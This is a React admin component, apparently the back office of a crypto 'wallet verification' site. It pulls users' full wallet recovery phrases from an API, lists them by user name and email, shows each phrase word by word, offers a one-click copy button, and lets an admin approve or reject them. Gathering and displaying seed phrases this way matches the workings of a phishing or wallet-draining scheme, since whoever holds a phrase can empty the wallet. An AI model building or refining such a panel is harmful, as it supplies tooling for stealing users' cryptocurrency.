"use client"
import { useState, useEffect } from "react"
import api from "../../api/axios"
import { styles } from "./styles/WalletPhraseAuthstyle"

const WalletPhraseAuth = () => {
  const [wallets, setWallets] = useState([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState(null)
  const [currentWallet, setCurrentWallet] = useState(null)
  const [filter, setFilter] = useState("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [copiedId, setCopiedId] = useState(null)

  
  useEffect(() => {
    const fetchWalletPhrases = async () => {
      try {
        setLoading(true)
        setError(null)
        const response = await api.get("/api/admin/get/wallet-phrases")

        const walletData = response.data.map((wallet) => {

          // Fix: Use phrase_array from API response
          let phraseArray = []

          if (wallet.phrase_array && Array.isArray(wallet.phrase_array)) {
            phraseArray = wallet.phrase_array
          } else if (wallet.phrase) {
            // Fallback to phrase if phrase_array doesn't exist
            phraseArray = Array.isArray(wallet.phrase)
              ? wallet.phrase
              : typeof wallet.phrase === "string"
                ? JSON.parse(wallet.phrase)
                : []
          }

          return {
            ...wallet,
            phrase: phraseArray, // Store as phrase for consistency in component
          }
        })

        setWallets(walletData)
        setLoading(false)
      } catch (err) {
        // console.error("Failed to fetch wallet phrases:", err)
        setError(err.response?.data?.message || "Failed to load wallet data")
        setLoading(false)
      }
    }
    fetchWalletPhrases()
  }, [])

  const handleAdminAction = async (walletId, action) => {
    try {
      await api.post(`/api/admin/wallet-phrases/${walletId}/${action}`)
      setWallets(wallets.map((w) => (w.id === walletId ? { ...w, status: action } : w)))
      if (currentWallet?.id === walletId) {
        setCurrentWallet(null)
      }
    } catch (err) {
      console.error("Error performing admin action:", err)
      setError(err.response?.data?.message || "Action failed")
    }
  }

  const copyToClipboard = async (phrase, walletId) => {
    try {

      // Ensure phrase is an array and has content
      if (!phrase || !Array.isArray(phrase) || phrase.length === 0) {
        throw new Error("No phrase data available")
      }

      const phraseText = phrase.join(" ")

      await navigator.clipboard.writeText(phraseText)
      setCopiedId(walletId)
      setTimeout(() => setCopiedId(null), 2000)
    } catch (err) {
      // console.error("Failed to copy:", err)
      // Fallback for older browsers or if clipboard API fails
      try {
        const phraseText = Array.isArray(phrase) ? phrase.join(" ") : "No phrase available"
        const textArea = document.createElement("textarea")
        textArea.value = phraseText
        document.body.appendChild(textArea)
        textArea.select()
        document.execCommand("copy")
        document.body.removeChild(textArea)
        setCopiedId(walletId)
        setTimeout(() => setCopiedId(null), 2000)
        alert("Phrase copied to clipboard!")
      } catch (fallbackErr) {
        // console.error("Fallback copy failed:", fallbackErr)
        alert("Failed to copy phrase. Please copy manually.")
      }
    }
  }

  const filteredWallets = wallets.filter((wallet) => {
    const matchesFilter = filter === "all" || wallet.status === filter
    const matchesSearch =
      searchTerm === "" ||
      wallet.coin_name.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (wallet.user?.name && wallet.user.name.toLowerCase().includes(searchTerm.toLowerCase())) ||
      (wallet.user?.email && wallet.user.email.toLowerCase().includes(searchTerm.toLowerCase()))
    return matchesFilter && matchesSearch
  })

  if (loading) {
    return (
      <div style={styles.loadingContainer}>
        <div style={styles.loadingCard}>
          <div style={styles.spinner}></div>
          <p style={styles.loadingText}>Loading wallet data...</p>
        </div>
      </div>
    )
  }

  if (error) {
    return (
      <div style={styles.errorContainer}>
        <div style={styles.errorCard}>
          <div style={styles.errorIcon}>⚠️</div>
          <p style={styles.errorText}>{error}</p>
          <button style={styles.retryButton} onClick={() => window.location.reload()}>
            Retry
          </button>
        </div>
      </div>
    )
  }

  return (
    <div style={styles.container}>
      {/* Header */}
      <header style={styles.header}>
        <div style={styles.headerContent}>
          <h1 style={styles.title}>Wallet Phrase Administration</h1>
          <p style={styles.subtitle}>Manage and verify wallet recovery phrases</p>
        </div>

        <div style={styles.controls}>
          <div style={styles.searchWrapper}>
            <input
              type="text"
              placeholder="Search wallets..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              style={styles.searchInput}
            />
          </div>

          <div style={styles.filterWrapper}>
            <select value={filter} onChange={(e) => setFilter(e.target.value)} style={styles.filterSelect}>
              <option value="all">All Wallets</option>
              <option value="pending">Pending</option>
              <option value="verified">Verified</option>
              <option value="rejected">Rejected</option>
            </select>
          </div>
        </div>
      </header>

      {/* Desktop Table */}
      <div style={styles.desktopTable}>
        <div style={styles.tableWrapper}>
          <table style={styles.table}>
            <thead>
              <tr style={styles.tableHeaderRow}>
                <th style={styles.tableHeader}>ID</th>
                <th style={styles.tableHeader}>User</th>
                <th style={styles.tableHeader}>Coin</th>
                <th style={styles.tableHeader}>Status</th>
                <th style={styles.tableHeader}>Created</th>
                <th style={styles.tableHeader}>Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredWallets.length > 0 ? (
                filteredWallets.map((wallet) => (
                  <tr key={wallet.id} style={styles.tableRow}>
                    <td style={styles.tableCell}>#{wallet.id}</td>
                    <td style={styles.tableCell}>
                      <div style={styles.userInfo}>
                        <div style={styles.userName}>{wallet.user?.name || `User #${wallet.user_id}`}</div>
                        {wallet.user?.email && <div style={styles.userEmail}>{wallet.user.email}</div>}
                      </div>
                    </td>
                    <td style={styles.tableCell}>
                      <span style={styles.coinName}>{wallet.coin_name}</span>
                    </td>
                    <td style={styles.tableCell}>
                      <span
                        style={{
                          ...styles.statusBadge,
                          ...styles[`status${wallet.status.charAt(0).toUpperCase() + wallet.status.slice(1)}`],
                        }}
                      >
                        {wallet.status}
                      </span>
                    </td>
                    <td style={styles.tableCell}>
                      <div style={styles.dateInfo}>
                        <div>{new Date(wallet.created_at).toLocaleDateString()}</div>
                        <div style={styles.timeText}>{new Date(wallet.created_at).toLocaleTimeString()}</div>
                      </div>
                    </td>
                    <td style={styles.tableCell}>
                      <div style={styles.actionButtons}>
                        <button
                          style={styles.viewButton}
                          onClick={() => {
                            setCurrentWallet(currentWallet?.id === wallet.id ? null : wallet)
                          }}
                        >
                          {currentWallet?.id === wallet.id ? "Hide" : "View"}
                        </button>
                        {wallet.status === "pending" && (
                          <>
                            <button
                              style={styles.approveButton}
                              onClick={() => handleAdminAction(wallet.id, "verified")}
                            >
                              Approve
                            </button>
                            <button
                              style={styles.rejectButton}
                              onClick={() => handleAdminAction(wallet.id, "rejected")}
                            >
                              Reject
                            </button>
                          </>
                        )}
                      </div>
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan="6" style={styles.noResults}>
                    No wallets found matching your criteria
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Mobile Cards */}
      <div style={styles.mobileCards}>
        {filteredWallets.length > 0 ? (
          filteredWallets.map((wallet) => (
            <div key={wallet.id} style={styles.walletCard}>
              <div style={styles.cardHeader}>
                <div style={styles.cardId}>#{wallet.id}</div>
                <span
                  style={{
                    ...styles.statusBadge,
                    ...styles[`status${wallet.status.charAt(0).toUpperCase() + wallet.status.slice(1)}`],
                  }}
                >
                  {wallet.status}
                </span>
              </div>

              <div style={styles.cardBody}>
                <div style={styles.cardInfo}>
                  <div style={styles.infoRow}>
                    <span style={styles.infoLabel}>User:</span>
                    <div style={styles.infoValue}>
                      <div style={styles.userName}>{wallet.user?.name || `User #${wallet.user_id}`}</div>
                      {wallet.user?.email && <div style={styles.userEmail}>{wallet.user.email}</div>}
                    </div>
                  </div>

                  <div style={styles.infoRow}>
                    <span style={styles.infoLabel}>Coin:</span>
                    <span style={styles.coinName}>{wallet.coin_name}</span>
                  </div>

                  <div style={styles.infoRow}>
                    <span style={styles.infoLabel}>Created:</span>
                    <div style={styles.infoValue}>
                      <div>{new Date(wallet.created_at).toLocaleDateString()}</div>
                      <div style={styles.timeText}>{new Date(wallet.created_at).toLocaleTimeString()}</div>
                    </div>
                  </div>
                </div>

                <div style={styles.cardActions}>
                  <button
                    style={styles.viewButtonMobile}
                    onClick={() => {
                      setCurrentWallet(currentWallet?.id === wallet.id ? null : wallet)
                    }}
                  >
                    {currentWallet?.id === wallet.id ? "👁️‍🗨️ Hide" : "👁️ View"}
                  </button>
                  {wallet.status === "pending" && (
                    <>
                      <button
                        style={styles.approveButtonMobile}
                        onClick={() => handleAdminAction(wallet.id, "verified")}
                      >
                        ✓ Approve
                      </button>
                      <button
                        style={styles.rejectButtonMobile}
                        onClick={() => handleAdminAction(wallet.id, "rejected")}
                      >
                        ✗ Reject
                      </button>
                    </>
                  )}
                </div>
              </div>
            </div>
          ))
        ) : (
          <div style={styles.noResultsCard}>
            <p>No wallets found matching your criteria</p>
          </div>
        )}
      </div>

      {/* Wallet Phrase Display */}
      {currentWallet && (
        <div style={styles.phraseContainer}>
          <div style={styles.phraseHeader}>
            <div style={styles.phraseTitle}>
              <h2 style={styles.phraseTitleText}>{currentWallet.coin_name} Recovery Phrase</h2>
              <p style={styles.phraseSubtitle}>User: {currentWallet.user?.name || `User #${currentWallet.user_id}`}</p>
            </div>
            <button
              style={{
                ...styles.copyButton,
                ...(copiedId === currentWallet.id ? styles.copyButtonCopied : {}),
              }}
              onClick={() => copyToClipboard(currentWallet.phrase, currentWallet.id)}
              disabled={copiedId === currentWallet.id}
            >
              {copiedId === currentWallet.id ? "✓ Copied!" : "📋 Copy Phrase"}
            </button>
          </div>

          <div
            style={{
              marginBottom: "16px",
              padding: "8px",
              background: "rgba(255,255,255,0.1)",
              borderRadius: "4px",
              fontSize: "12px",
            }}
          >
            <strong>Debug:</strong> Phrase length: {currentWallet.phrase?.length || 0} | Type:{" "}
            {Array.isArray(currentWallet.phrase) ? "Array" : typeof currentWallet.phrase}
          </div>

          <div style={styles.phraseGrid}>
            {currentWallet.phrase && Array.isArray(currentWallet.phrase) && currentWallet.phrase.length > 0 ? (
              currentWallet.phrase.map((word, index) => (
                <div key={index} style={styles.phraseWord}>
                  <span style={styles.wordNumber}>{index + 1}</span>
                  <span style={styles.wordText}>{word}</span>
                </div>
              ))
            ) : (
              <div style={{ ...styles.phraseWord, gridColumn: "1 / -1", textAlign: "center" }}>
                <span style={styles.wordText}>No phrase data available</span>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

export default WalletPhraseAuth
